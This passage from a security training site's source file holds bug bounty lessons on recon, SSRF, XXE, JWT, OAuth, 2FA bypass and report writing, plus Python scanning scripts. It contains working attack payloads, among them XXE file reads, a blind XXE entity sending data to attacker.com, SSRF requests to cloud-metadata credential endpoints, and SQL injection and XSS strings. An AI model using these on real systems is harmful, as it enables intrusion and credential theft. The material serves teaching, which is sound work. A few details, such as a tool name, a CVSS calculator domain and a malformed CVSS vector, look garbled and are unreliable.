        "Masscan for large scopes:\n" +
        "masscan -p1-65535 10.0.0.0/8 --rate=5000 -oJ scan.json\n" +
        "# For massive scopes (entire ASN)\n\n" +
        "What to look for on non-standard ports:\n\n" +
        "8080 — Developer test panels, debugging interfaces\n" +
        "8443 — HTTPS admin panels\n" +
        "3000 — Node.js dev servers, CI/CD\n" +
        "5000 — Flask dev servers, internal APIs\n" +
        "27017 — MongoDB (no auth by default)\n" +
        "9200 — Elasticsearch (default: no auth in dev)\n" +
        "6379 — Redis (no auth by default)\n" +
        "11211 — Memcached\n" +
        "27018 — MongoDB Atlas default\n" +
        "50000 — SAP services\n" +
        "21 — FTP (anonymous access?)\n" +
        "873 — rsync (unauthenticated?)\n\n" +
        "Finding hidden virtual hosts:\n" +
        "nmap -p 80,443 --script=vhost-brute target.com\n" +
        "ffuf -w /usr/share/wordlists/vhosts.txt -u https://target.com -H \"Host: FUZZ.target.com\"\n" +
        "# Virtual host brute forcing — finds dev.staging.target.com and similar\n\n" +
        "Shodan for target reconnaissance:\n" +
        "# Search shodan.io for target's ASN or IP ranges\n" +
        "org:\"Target Corporation\"\n" +
        "port:22,3389,3306  # Find exposed services\n\n" +
        "Service-specific exploitation:\n" +
        "- Elasticsearch: GET /_cluster/health (check if unauthenticated)\n" +
        "- Kibana: Check if unauthenticated → possible RCE via dashboard\n" +
        "- MongoDB: mongosh mongodb://target.com:27017 (no auth?)\n" +
        "- Redis: redis-cli -h target.com (no auth?)",
    },
  ],
};

const mod26 = {
  title: 'Module 2: SSRF, XXE & Server-Side Injection',
  lessons: [
    {
      key: 'mod26_2_0',
      title: 'Server-Side Request Forgery (SSRF)',
      content:
        "SSRF lets you make the server do your bidding — fetch internal resources, scan internal networks, read cloud metadata. One of the highest-impact bug classes.\n\n" +
        "What SSRF looks like:\n" +
        "GET /api/fetch?url=https://example.com/image.jpg\n" +
        "GET /api/preview?url=http://internal-server/admin\n" +
        "POST /api/webhook --data '{\"url\":\"https://example.com/callback\"}'\n\n" +
        "Common vulnerable parameters:\n" +
        "url, src, dest, redirect, uri, path, continue, url, window, next, data, reference, site, html, val, validate, domain, callback, return, page, feed, host, port, to, out, view, dir, aspxaction, board, mod, history, command, desc, name, context, xpage, spath, q, url\", uuid\n\n" +
        "Blind SSRF (no direct response):\n" +
        "Use out-of-band detection:\n" +
        "url=http://your-server.com/your-endpoint\n" +
        "# Check your server logs for incoming requests\n" +
        "# Tools: Burp Collaborator, Interactsh, DNSBin\n\n" +
        "Bypassing SSRF filters:\n" +
        "1. Localhost bypass: 127.0.0.1, localhost, 0.0.0.0\n" +
        "2. Localhost variations: [::1], 2130706433 (decimal for 127.0.0.1)\n" +
        "3. IP encoding: 0177.0000.0000.0001 (octal), 0x7f000001 (hex)\n" +
        "4. URL parsing tricks: http://127.1/ (short form)\n" +
        "5. Redirect: http://attacker.com redirect to file:///etc/passwd\n" +
        "6. DNS rebinding: attacker-controlled domain that resolves to internal IP\n\n" +
        "AWS Metadata exploitation (critical finding):\n" +
        "http://169.254.169.254/latest/meta-data/\n" +
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/\n" +
        "http://169.254.169.254/latest/user-data/\n" +
        "# Returns AWS credentials for the server's IAM role\n" +
        "# Often gives access to S3, DynamoDB, other AWS services\n\n" +
        "Cloud metadata (similar on GCP, Azure, DigitalOcean):\n" +
        "http://metadata.google.internal/computeMetadata/v1/\n" +
        "http://169.254.169.254/metadata/v1/instance?id\n\n" +
        "Port scanning via SSRF:\n" +
        "url=http://localhost:22   # Check if port is open\n" +
        "url=http://internal-network:3306  # Scan internal network\n" +
        "# Measure response time to determine open/closed ports",
    },
    {
      key: 'mod26_2_1',
      title: 'XML External Entity (XXE) Attacks',
      content:
        "XXE lets you make the XML parser fetch internal files or perform server-side actions. Common in applications that process XML directly.\n\n" +
        "Classic XXE (in-band):\n" +
        "<?xml version=\"1.0\"?>\n" +
        "<!DOCTYPE root [\n" +
        "  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n" +
        "]>\n" +
        "<root><name>&xxe;</name></root>\n\n" +
        "Blind XXE (out-of-band):\n" +
        "<?xml version=\"1.0\"?>\n" +
        "<!DOCTYPE root [\n" +
        "  <!ENTITY % xxe SYSTEM \"http://attacker.com/steal?data=PUBLIC\">\n" +
        "  %xxe;\n" +
        "]>\n" +
        "<root>&xxe;</root>\n\n" +
        "Billion Laughs Attack (DoS):\n" +
        "<?xml version=\"1.0\"?>\n" +
        "<!DOCTYPE lolz [\n" +
        "  <!ENTITY lol \"lol\">\n" +
        "  <!ENTITY lol2 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">\n" +
        "  <!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\">\n" +
        "]>\n" +
        "<root>&lol3;</root>\n\n" +
        "Where XXE appears:\n" +
        "- SOAP APIs (XML-based)\n" +
        "- File uploads (docx, xlsx, pdf - contain XML)\n" +
        "- RSS/Atom feeds\n" +
        "- SVG image uploads (parsed as XML)\n" +
        "- SAML authentication (XML-based)\n" +
        "- XML parsers in general\n\n" +
        "Finding XXE in Burp:\n" +
        "1. Find XML-based request (Content-Type: text/xml or application/xml)\n" +
        "2. Try inserting <!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n" +
        "3. Look for file contents in response\n\n" +
        "Exploitation paths:\n" +
        "- Read local files: file:///etc/passwd, file:///C:/Windows/win.ini\n" +
        "- Read source code: file:///var/www/html/index.php\n" +
        "- SSRF via XXE: <!ENTITY xxe SYSTEM \"http://internal-server:22\">\n" +
        "- RCE if expect the response can be written somewhere accessible",
    },
    {
      key: 'mod26_2_2',
      title: 'Race Conditions & Timing Attacks',
      content:
        "Race conditions happen when the application makes assumptions about the order of events that do not hold under concurrent load. Often high-impact.\n\n" +
        "Where race conditions exist:\n" +
        "- Gift card redemption (claim gift, then use twice)\n" +
        "- Account balance operations (transfer, then double-spend)\n" +
        "- Password reset (request token, then change password before token expires)\n" +
        "- Lottery/auction bids (bid at same time as others)\n" +
        "- API rate limiting (send 100 requests before limit check completes)\n\n" +
        "Testing for race conditions with Turbola:\n" +
        "1. Intercept request in Burp\n" +
        "2. Send to Turbo Intruder (Ctrl+Shift+T)\n" +
        "3. Payload:\n" +
        "def queueRequests(target, engine):\n" +
        "    engine.queue(target.req, 50)  # Send 50 identical requests\n\n" +
        "4. Analyze responses — if sum of results > expected, race condition exists\n\n" +
        "Race condition example — gift card:\n" +
        "POST /redeem code=GIFT123\n" +
        "# Response: {\"success\": true, \"balance\": ₦5000}\n" +
        "# Send 50 concurrent requests → each might get ₦5000 before check completes\n" +
        "# Expected: only 1 success. Actual: 50 successes = ₦250,000 stolen\n\n" +
        "HTTP/2 concurrent multiplexing:\n" +
        "# With HTTP/2, you can send multiple requests on same connection simultaneously\n" +
        "# Some apps do not handle concurrent requests properly\n" +
        "# Use h2c (HTTP/2 over cleartext) to test\n\n" +
        "Timing attacks:\n" +
        "# Password comparison that exits early on wrong character:\n" +
        "checkPassword(candidate, real):\n" +
        "  for i in range(len(real)):\n" +
        "    if candidate[i] != real[i]:\n" +
        "      return False\n" +
        "  return True\n" +
        "# Measuring response time for 'passwordX' vs 'passwordA' reveals character by character\n" +
        "\n" +
        "Testing for timing leaks:\n" +
        "for char in 'abcdefghijklmnopqrstuvwxyz':\n" +
        "    start = time.time()\n" +
        "    requests.post('/login', data={'username':'admin', 'password':'admin'+char})\n" +
        "    elapsed = time.time() - start\n" +
        "    print(f'{char}: {elapsed}')\n" +
        "# Character that takes longest might be correct (brute force via timing)",
    },
    {
      key: 'mod26_2_3',
      title: 'IDOR & Broken Access Control',
      content:
        "Insecure Direct Object References (IDOR) — you access someone else's data by changing a parameter. Classic, common, often high-value.\n\n" +
        "Finding IDOR:\n" +
        "1. Find endpoint that accesses a resource: GET /api/orders/12345\n" +
        "2. Change the ID: GET /api/orders/12346\n" +
        "3. If you see someone else's data, it is IDOR\n\n" +
        "IDOR in different parameter locations:\n" +
        "- URL path: /users/12345 → /users/12346\n" +
        "- Query string: /view?invoice=123 → /view?invoice=456\n" +
        "- POST body: order_id=789 → order_id=790\n" +
        "- JSON: {\"id\": 123} → {\"id\": 124}\n" +
        "- Headers: X-User-ID: 123 → X-User-ID: 124\n" +
        "- Cookies: JWT token containing user ID\n\n" +
        "Indirect references (harder to test):\n" +
        "- App uses internal ID mapping: /orders/ABC123 ↔ /orders/54321\n" +
        "# You need to find the mapping first\n" +
        "# Burp Sequencer can sometimes reveal patterns\n\n" +
        "Mass IDOR testing with Autorize:\n" +
        "1. Login as User A, get all requests\n" +
        "2. Login as User B\n" +
        "3. In Burp, run Autorize with User A's token → it replays all User A requests as User B\n" +
        "4. If User B can access User A's resources, Autorize shows: \"IS ENFORCED? false\"\n\n" +
        "Common vulnerable endpoints:\n" +
        "/api/user/profile → Try /api/user/12345\n" +
        "/download?file=invoice_123.pdf → Try invoice_456.pdf\n" +
        "/api/v1/posts/{post_id}/delete → Delete another user's post\n" +
        "/api/transfer?to_account=456&amount=1000 → Transfer to wrong account\n" +
        "\n" +
        "Access control testing checklist:\n" +
        "1. Horizontal: Can User A access User B's resources? (same privilege level)\n" +
        "2. Vertical: Can regular user access admin features?\n" +
        "3. Unauthenticated: Can anonymous access protected endpoints?\n" +
        "4. Method-based: GET allowed but POST blocked for same resource?\n" +
        "5. Parameter tampering: UUID, ID, GUID enumeration",
    },
  ],
};

const mod27 = {
  title: 'Module 3: Authentication & Session Vulnerabilities',
  lessons: [
    {
      key: 'mod27_3_0',
      title: 'JWT Attacks & Session Management',
      content:
        "JSON Web Tokens (JWT) are commonly misconfigured. Exploiting JWT vulnerabilities can give you authentication bypass and privilege escalation.\n\n" +
        "JWT structure: header.payload.signature\n" +
        "Example: eyJhbGciOiJIUzI1NiJ9.eyJ1c2VySWQiOjEyM30.abc123\n" +
        "\n" +
        "JWT attacks:\n\n" +
        "Algorithm confusion (none algorithm):\n" +
        "Change: {\"alg\": \"HS256\"} → {\"alg\": \"none\"}\n" +
        "Remove signature entirely (leave payload as header.payload.)\n" +
        "# If server accepts \"none\", you can forge any token\n\n" +
        "Key confusion (RS256 → HS256):\n" +
        "1. Get the public key from server (often at /jwks, /.well-known/jwks.json)\n" +
        "2. Server uses RS256 (asymmetric) but you tell it HS256 (symmetric)\n" +
        "3. Sign token with the PUBLIC KEY as if it were the secret\n" +
        "# Server verifies with its private key, but you signed with public key — same key pair\n\n" +
        "Weak secret brute force:\n" +
        "jwttool.py -t http://target.com/api -rh \"Authorization: Bearer <jwt>\" -C -w wordlist.txt\n" +
        "# If secret is weak (like 'secret123'), you can crack it and forge tokens\n\n" +
        "Session management flaws:\n" +
        "- Session tokens in URL (logout everywhere feature)\n" +
        "- Session not invalidated after password change\n" +
        "- Session fixation (attacker sets session ID before user logs in)\n" +
        "- Session prediction (weak random generation)\n" +
        "- No session timeout (_session never expires)\n\n" +
        "Testing session security:\n" +
        "1. Log in, note session cookie\n" +
        "2. Log out, try using the same session cookie\n" +
        "3. Log in from different IP, check if old session is still valid\n" +
        "4. Check if session cookie has HttpOnly, Secure flags\n" +
        "5. Check session expiration — JWT exp claim",
    },
    {
      key: 'mod27_3_1',
      title: 'OAuth 2.0 Vulnerabilities',
      content:
        "OAuth 2.0 is everywhere — Google login, Facebook login, \"Login with X\". Misconfigurations are common and can lead to account takeover.\n\n" +
        "OAuth flow basics:\n" +
        "1. User clicks \"Login with Google\"\n" +
        "2. Redirect to Google: https://accounts.google.com/o/oauth2/v2/auth?client_id=...&redirect_uri=callback\n" +
        "3. User authenticates with Google\n" +
        "4. Google redirects back to callback?code=authorization_code\n" +
        "5. Your server exchanges code for access_token\n" +
        "6. Your server uses access_token to get user info from Google\n\n" +
        "Common OAuth vulnerabilities:\n\n" +
        "Redirect URI validation:\n" +
        "- Server must validate exactly which URI the code can be exchanged at\n" +
        "- Bypass with: https://target.com/callback?redirect=https://evil.com\n" +
        "- Or: https://target.com%2f%2fevil.com (double slash interpreted as host)\n" +
        "- Or: https://target.com..evil.com (subdomain takeover)\n\n" +
        "State parameter missing (CSRF on OAuth):\n" +
        "- OAuth flows are susceptible to CSRF\n" +
        "- If no state parameter, attacker can link their account to victim's session\n" +
        "- With state: server checks state parameter to ensure it is the same flow\n\n" +
        "Code interception:\n" +
        "- If redirect_uri is not strictly validated, attacker steals code from logs/referrer\n" +
        "- Exchange code for access token before victim does\n\n" +
        "Token leakage:\n" +
        "- Access tokens sent in Referer header to third parties\n" +
        "- Tokens in browser history\n" +
        "- Tokens in server logs\n\n" +
        "Testing OAuth with Burp:\n" +
        "1. Capture the authorization request\n" +
        "2. Check redirect_uri against server's registered URIs\n" +
        "3. Test if you can redirect to a different domain\n" +
        "4. Check if state parameter is present and random\n" +
        "5. Try to reuse an authorization code (should be single-use)",
    },
    {
      key: 'mod27_3_2',
      title: 'Password Reset & Auth Bypass',
      content:
        "Password reset vulnerabilities are among the easiest to find and often lead directly to account takeover. Here is how to test them systematically.\n\n" +
        "Password reset via email token:\n" +
        "1. Request reset → email sent with token\n" +
        "2. Token is predictable (UUID, timestamp, user ID encoding)\n" +
        "3. Token expiration too long (days instead of minutes)\n" +
        "4. Token reusable (can use same token twice)\n" +
        "5. Token leakage in Referer header or logs\n\n" +
        "Token prediction:\n" +
        "# Check if tokens follow a pattern:\n" +
        "Request reset for user1@target.com → token: a1b2c3d4\n" +
        "Request reset for user2@target.com → token: a1b2c3d5  # Sequential!\n" +
        "\n" +
        "Password reset via email manipulation:\n" +
        "email=user@target.com → sends to user@target.com\n" +
        "email=attacker@evil.com → sends to attacker@evil.com?\n" +
        "# If server sends reset link to whatever email you provide, you can take over any account\n\n" +
        "Password reset via username enumeration:\n" +
        "POST /reset-password\n" +
        "{\"username\": \"admin\"} → \"User not found\" vs \"Email sent\"\n" +
        "# Knowing which accounts exist helps targeted attacks\n\n" +
        "Brute forcing the reset token:\n" +
        "# Common patterns: 6-digit numeric (000000-999999)\n" +
        "# Test with multiple concurrent requests at high speed\n" +
        "# Check if rate limiting exists\n\n" +
        "Authentication bypass patterns:\n" +
        "- SQL injection in login: admin' OR '1'='1' --\n" +
        "- LDAP injection: admin*)(&=(\n" +
        "- No rate limiting on login (brute force)\n" +
        "- Password not hashed (plaintext storage)\n" +
        "- Weak password policy (no complexity, no lockout)\n\n" +
        "Testing auth with intruder:\n" +
        "1. Capture login POST\n" +
        "2. Send to Intruder, add positions at username and password\n" +
        "3. Use username wordlist and password wordlist\n" +
        "4. Look for unusual responses (different length, different error message, redirect vs stay)",
    },
    {
      key: 'mod27_3_3',
      title: '2FA & MFA Bypass Techniques',
      content:
        "Two-factor authentication adds significant security, but implementations often have flaws that let you bypass them.\n\n" +
        "Common 2FA bypass techniques:\n\n" +
        "1. Response manipulation:\n" +
        "After entering correct 2FA code, intercept response:\n" +
        "{\"success\": false, \"code\": \"123456\"}\n" +
        "Modify to: {\"success\": true, \"code\": \"123456\"}\n" +
        "# If server trusts the response without verifying, you bypass 2FA\n\n" +
        "2. Status code manipulation:\n" +
        "HTTP/1.1 401 Unauthorized\n" +
        "Modify to: HTTP/1.1 200 OK\n" +
        "# Some apps check status code, not actual auth state\n\n" +
        "3. Cookie manipulation:\n" +
        "2FA completion might set a cookie or token\n" +
        "Try re-using the cookie before 2FA is completed\n" +
        "# Cookie might be set before verification is actually checked\n\n" +
        "4. Force browsing:\n" +
        "# If 2FA is optional (user can skip it), try navigating directly to dashboard\n" +
        "POST /2fa-verify\n" +
        "Then immediately GET /dashboard\n\n" +
        "5. Race condition (2FA race):\n" +
        "Send valid 2FA code + high-speed subsequent requests\n" +
        "Before verification completes, some requests might slip through\n\n" +
        "6. Backup codes / brute force:\n" +
        "Many apps allow 10 backup codes instead of SMS/app\n" +
        "Brute force each code (often 8 digits)\n" +
        "Check for rate limiting\n\n" +
        "7. CSRF on 2FA setup:\n" +
        "Attacker sets up 2FA on victim's account via CSRF\n" +
        "Victim now cannot log in without the attacker's 2FA device\n\n" +
        "Testing 2FA bypass:\n" +
        "1. Complete step 1 (login) and step 2 (2FA) legitimately\n" +
        "2. Note all cookies and tokens created\n" +
        "3. Start fresh: login with correct creds, intercept at 2FA step\n" +
        "4. Try various bypass techniques\n" +
        "5. Also try: does 2FA expire? Can you stay logged in across sessions?",
    },
  ],
};

const mod28 = {
  title: 'Module 4: Bug Bounty Report Writing',
  lessons: [
    {
      key: 'mod28_4_0',
      title: 'Writing a High-Quality Report',
      content:
        "A great bug report gets you paid faster. Write clearly, prove everything, and make the security engineer's job easy.\n\n" +
        "Report structure:\n\n" +
        "1. TITLE: One line, describes the vulnerability clearly\n" +
        "Bad: \"XSS in user profile\"\n" +
        "Good: \"Stored XSS via profile picture filename\"\n\n" +
        "2. SUMMARY (2-3 sentences):\n" +
        "What is the bug, how did you find it, why does it matter?\n" +
        "\"The /api/profile endpoint accepts unsanitized input in the bio field. When other users view the profile, the payload executes as JavaScript, allowing session hijacking.\"\n\n" +
        "3. STEP TO REPRODUCE (numbered, specific):\n" +
        "1. Log in as testuser@target.com\n" +
        "2. Navigate to /profile/edit\n" +
        "3. In the Bio field, enter: <img src=x onerror=alert(document.cookie)>\n" +
        "4. Save changes\n" +
        "5. View your profile as a different user\n" +
        "6. Observe alert box showing session cookie\n\n" +
        "4. IMPACT: Explain clearly what an attacker could do\n" +
        "\"An attacker could steal session cookies and take over any user account, including admin accounts, leading to complete system compromise.\"\n\n" +
        "5. EVIDENCE: Screenshots, videos, Burp traffic\n" +
        "- Screenshots at each step\n" +
        "- Video of full exploit (30-60 seconds max)\n" +
        "- Raw HTTP request/response from Burp\n\n" +
        "6. REMEDIATION: What should the client do?\n" +
        "- Encode output in all user-generated fields\n" +
        "- Use Content-Security-Policy header\n" +
        "- Validate input on server-side, not just client\n\n" +
        "7. REQUIRED INFORMATION:\n" +
        "- Your HackerOne username\n" +
        "- Steps to reproduce\n" +
        "- System(s) affected\n" +
        "- Impact\n" +
        "- Remediation\n" +
        "- Severity (CVSS)\n\n" +
        "What NOT to do:\n" +
        "- Vague steps: \"Try some inputs and see what happens\"\n" +
        "- Missing evidence: \"I found SQL injection but didn't capture it\"\n" +
        "- Inflated impact: \"This could end humanity\"\n" +
        "- Wrong severity: Rate your findings honestly",
    },
    {
      key: 'mod28_4_1',
      title: 'CVSS Scoring & Severity Assessment',
      content:
        "The security team will score your findings. Understanding CVSS helps you communicate severity accurately and avoid your finding being dismissed as Low when it is actually Critical.\n\n" +
        "CVSS 3.1 vector string:\n" +
        "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N\n" +
        "AV = Attack Vector (N/A/L/P)\n" +
        "AC = Attack Complexity (L/H)\n" +
        "PR = Privileges Required (N/L/H)\n" +
        "UI = User Interaction (N/R)\n" +
        "S = Scope (U/C)\n" +
        "C/I/A = Confidentiality/Integrity/Availability impact (N/L/H)\n\n" +
        "Severity ratings:\n" +
        "Critical (9.0-10.0): RCE, deserialization, SQL injection with admin\n" +
        "High (7.0-8.9): IDOR, stored XSS with session hijacking, SSRF → cloud metadata\n" +
        "Medium (4.0-6.9): Reflected XSS, CSRF, weak JWT, open redirect\n" +
        "Low (0.1-3.9): Informational disclosures, TRACE method enabled\n" +
        "None (0.0): No vulnerability\n\n" +
        "Real examples:\n" +
        "SSRF → AWS metadata access = Critical (AV:N/PR:N/AC:L/S:U/C:H/I:H/A:H)\n" +
        "Stored XSS in comment = High (AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N)\n" +
        "Open redirect in login = Medium (AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:N)\n" +
        "Tech stack disclosure = Low (N/A/N/N/R/U/C:N/I:N/A:N)\n\n" +
        "When scoring is disputed:\n" +
        "- Provide evidence that justifies your score\n" +
        "- Reference CVSS calculator (first.bv.gs instead of cvss.es)\n" +
        "- Show how a real attacker would exploit it\n" +
        "- Show actual business impact, not theoretical impact\n" +
        "- Accept reasoned disagreements if based on actual risk factors",
    },
    {
      key: 'mod28_4_2',
      title: 'Negotiating & Handling Duplicates',
      content:
        "Bug bounty is a business relationship. How you handle duplicates, disputes, and negotiations affects how much you get paid and how quickly.\n\n" +
        "Handling duplicates:\n" +
        "1. Check if it is really duplicate — sometimes two hunters find the same bug but one has better steps\n" +
        "2. If duplicate: accept it gracefully, ask if there is a duplicate bounty (some programs pay partial for duplicates)\n" +
        "3. Check if your finding has additional impact the first report missed — you might still get a reward\n" +
        "4. Never argue aggressively with triagers — be professional, factual, concise\n\n" +
        "Negotiating for higher bounties:\n" +
        "1. Justify impact clearly — show real-world scenario, not just PoC\n" +
        "2. Reference comparable reports on HackerOne or similar programs\n" +
        "3. If program has high bounty range, cite the maximum and explain why your finding qualifies\n" +
        "4. Give additional context: how would an attacker use this in an attack chain?\n" +
        "5. Do not be greedy — a reasonable request gets honored, an unreasonable one gets dismissed\n\n" +
        "Disputing severity (when triager downgrades your finding):\n" +
        "1. Ask why it was downgraded — sometimes triager has a good reason you missed\n" +
        "2. Provide additional evidence supporting your severity\n" +
        "3. Show a realistic attack scenario (not theoretical)\n" +
        "4. If still disagreeing after one round, escalate to program admin\n" +
        "5. Do not spam or repeatedly argue — one clear, well-reasoned response is best\n\n" +
        "Building reputation for bigger payouts:\n" +
        "- Submit well-written, thorough reports consistently\n" +
        "- Respond quickly to triager questions\n" +
        "- Provide clear reproduction steps every time\n" +
        "- Never submit duplicate reports carelessly (check scope first)\n" +
        "- Programs invite top hackers to private programs based on reputation\n\n" +
        "Nigerian-relevant bug bounty platforms:\n" +
        "- HackerOne: largest, most programs\n" +
        "- Bugcrowd: second largest, strong enterprise base\n" +
        "- Open Bug Bounty: coordinated disclosure platform\n" +
        "- Some African programs: South Africa, Nigeria-based companies use HackerOne/Bugcrowd globally",
    },
  ],
};

export const COURSES: Course[] = [
  {
    id: 1,
    title: 'Web Penetration Testing from Scratch',
    description: 'Learn how web apps actually get broken. Covers the OWASP Top 10 with hands-on labs you run against real vulnerable targets.',
    instructor: 'Muhammad Aminu Musa',
    level: 'Beginner – Intermediate',
    duration: '12 hours',
    lessons: 28,
    image: '🌐',
    modules: [mod1, mod2, mod3, mod4, mod5, mod6],
  },
  {
    id: 2,
    title: 'Python for Security Automation',
    description: 'Stop doing everything manually. Learn to automate recon, scanning, and reporting with Python. Build your own security tools.',
    instructor: 'Muhammad Aminu Musa',
    level: 'Intermediate',
    duration: '8 hours',
    lessons: 18,
    image: '🐍',
    modules: [
      {
        title: 'Module 1: Python Refresher',
        lessons: [
          {
            key: 'mod2_1_0',
            title: 'Requests, BeautifulSoup & API Basics',
            content:
              "Most of your automation work will be HTTP requests plus parsing the response. Here is what you need.\n\n" +
              "The requests library:\n" +
              "import requests\n\n" +
              "r = requests.get('https://target.com/api/users')\n" +
              "print(r.status_code)\n" +
              "print(r.json())  # parse JSON response\n" +
              "print(r.text)     # raw text\n\n" +
              "r = requests.post('https://target.com/login', data={'username': 'admin', 'password': 'password123'})\n\n" +
              "r = requests.get('https://target.com/api/profile', headers={'Authorization': 'Bearer YOUR_TOKEN'}, cookies={'session': 'abc123'})\n\n" +
              "BeautifulSoup for parsing HTML:\n" +
              "from bs4 import BeautifulSoup\n" +
              "html = r.text\n" +
              "soup = BeautifulSoup(html, 'html.parser')\n" +
              "links = soup.find_all('a')\n" +
              "for link in links: print(link.get('href'))\n\n" +
              "Working with APIs (REST):\n" +
              "requests.get(url, params={})    # read\n" +
              "requests.post(url, json={})     # create\n" +
              "requests.put(url, json={})      # full replace\n" +
              "requests.patch(url, json={})   # partial update\n" +
              "requests.delete(url)            # delete",
          },
          {
            key: 'mod2_1_1',
            title: 'Working with JSON & Data Files',
            content:
              "You will handle JSON constantly. Python makes this easy.\n\n" +
              "JSON handling:\n" +
              "import json\n\n" +
              "# Parse JSON from API response\n" +
              "r = requests.get('https://api.github.com/users/octocat')\n" +
              "data = r.json()\n" +
              "print(data['login'], data['followers'])\n\n" +
              "# Write JSON to file\n" +
              "with open('output.json', 'w') as f:\n" +
              "    json.dump(data, f, indent=2)\n\n" +
              "# Read JSON from file\n" +
              "with open('data.json') as f:\n" +
              "    data = json.load(f)\n\n" +
              "CSV handling:\n" +
              "import csv\n\n" +
              "# Write\n" +
              "with open('vulns.csv', 'w', newline='') as f:\n" +
              "    writer = csv.DictWriter(f, fieldnames=['url', 'severity', 'finding'])\n" +
              "    writer.writeheader()\n" +
              "    writer.writerows(vulnerabilities)\n\n" +
              "# Read\n" +
              "with open('targets.csv') as f:\n" +
              "    reader = csv.DictReader(f)\n" +
              "    for row in reader: scan(row['url'])",
          },
        ],
      },
      {
        title: 'Module 2: Recon Automation',
        lessons: [
          {
            key: 'mod2_2_0',
            title: 'Subdomain Enumeration with Python',
            content:
              "Subdomain enumeration is one of the most important recon steps. Here is how to automate it.\n\n" +
              "Wordlist-based enumeration:\n" +
              "import requests\n\n" +
              "def enumerate_subdomains(domain, wordlist_file):\n" +
              "    found = []\n" +
              "    with open(wordlist_file) as f:\n" +
              "        for line in f:\n" +
              "            word = line.strip()\n" +
              "            subdomain = f\"{word}.{domain}\"\n" +
              "            url = f\"https://{subdomain}\"\n" +
              "            try:\n" +
              "                r = requests.get(url, timeout=3, verify=False, allow_redirects=False)\n" +
              "                if r.status_code < 500:\n" +
              "                    print(f\"[+] Found: {subdomain} ({r.status_code})\")\n" +
              "                    found.append(subdomain)\n" +
              "            except requests.exceptions.RequestException:\n" +
              "                pass\n" +
              "    return found\n\n" +
              "Certificate Transparency (using crt.sh):\n" +
              "import requests\n\n" +
              "def ct_enumeration(domain):\n" +
              "    url = f\"https://crt.sh/?q=%25.{domain}&output=json\"\n" +
              "    r = requests.get(url, timeout=30)\n" +
              "    data = r.json()\n" +
              "    subdomains = set()\n" +
              "    for entry in data:\n" +
              "        name = entry['name_value']\n" +
              "        subdomains.update(name.replace('*.', '').split('\\n'))\n" +
              "    return sorted(subdomains)\n\n" +
              "Practical note: Combine all approaches - CT logs give you the most comprehensive results, wordlist gives you valid subdomains that might not have been in CT logs, and DNS resolution filters out non-existent ones.",
          },
          {
            key: 'mod2_2_1',
            title: 'Port Scanning with Python Socket',
            content:
              "You can build a fast port scanner with Python's socket library. No nmap needed for basic scans.\n\n" +
              "Simple TCP scanner:\n" +
              "import socket\n" +
              "from concurrent.futures import ThreadPoolExecutor\n\n" +
              "def scan_port(host, port, timeout=2):\n" +
              "    try:\n" +
              "        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n" +
              "        sock.settimeout(timeout)\n" +
              "        result = sock.connect_ex((host, port))\n" +
              "        sock.close()\n" +
              "        if result == 0:\n" +
              "            try:\n" +
              "                service = socket.getservbyport(port)\n" +
              "            except:\n" +
              "                service = 'unknown'\n" +
              "            return port, service\n" +
              "    except:\n" +
              "        pass\n" +
              "    return None\n\n" +
              "def scan_range(host, start_port=1, end_port=1024, threads=100):\n" +
              "    open_ports = []\n" +
              "    with ThreadPoolExecutor(max_workers=threads) as executor:\n" +
              "        futures = [executor.submit(scan_port, host, p) for p in range(start_port, end_port+1)]\n" +
              "        for future in futures:\n" +
              "            result = future.result()\n" +
              "            if result:\n" +
              "                open_ports.append(result)\n" +
              "                print(f\"[+] Open: {result[0]} ({result[1]})\")\n" +
              "    return sorted(open_ports)\n\n" +
              "Common high-value ports: 21 FTP, 22 SSH, 23 Telnet, 25 SMTP, 53 DNS, 80 HTTP, 110 POP3, 143 IMAP, 443 HTTPS, 445 SMB, 3306 MySQL, 3389 RDP, 5432 PostgreSQL, 8080 HTTP-alt",
          },
          {
            key: 'mod2_2_2',
            title: 'CORS Misconfiguration Checks',
            content:
              "CORS misconfigurations can allow attackers to steal data from authenticated users. Here is how to check for them.\n\n" +
              "What is CORS: Browsers enforce Same-Origin Policy. CORS is a way for servers to explicitly allow cross-origin requests.\n\n" +
              "Misconfiguration to look for:\n\n" +
              "import requests\n\n" +
              "def check_cors(url):\n" +
              "    r1 = requests.get(url, headers={'Origin': 'null'})\n" +
              "    print(f\"Origin 'null': {r1.headers.get('Access-Control-Allow-Origin', 'MISSING')}\")\n\n" +
              "    r2 = requests.get(url, headers={'Origin': 'https://evil.com'})\n" +
              "    print(f\"Reflected: {r2.headers.get('Access-Control-Allow-Origin', 'MISSING')}\")\n\n" +
              "    acr = r2.headers.get('Access-Control-Allow-Credentials', '')\n" +
              "    if acr == 'true':\n" +
              "        print(\"[!] Allows credentials with arbitrary origin\")\n\n" +
              "Exploiting CORS for account takeover:\n" +
              "The attacker hosts a page that uses fetch with credentials include.\n" +
              "If the target has a misconfigured CORS policy allowing the attacker's origin,\n" +
              "the victim's browser sends the session cookie, and the attacker receives the data.\n\n" +
              "Dangerous combinations:\n" +
              "- Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true\n" +
              "- Origin reflection with credentials\n" +
              "- Access-Control-Allow-Origin: null",
          },
        ],
      },
      {
        title: 'Module 3: Vulnerability Scanning',
        lessons: [
          {
            key: 'mod2_3_0',
            title: 'Writing a Basic CVE Scanner',
            content:
              "You can automate CVE scanning for your targets by checking versions against known vulnerabilities.\n\n" +
              "Basic version scanner:\n" +
              "import requests\n" +
              "import re\n\n" +
              "def detect_versions(target):\n" +
              "    versions = {}\n" +
              "    r = requests.get(target)\n" +
              "    server = r.headers.get('Server', '')\n" +
              "    versions['server'] = server\n" +
              "    html = r.text.lower()\n" +
              "    if 'wordpress' in html:\n" +
              "        match = re.search(r'version/([0-9.]+)', html)\n" +
              "        versions['cms'] = f\"WordPress {match.group(1) if match else 'unknown'}\"\n" +
              "    return versions\n\n" +
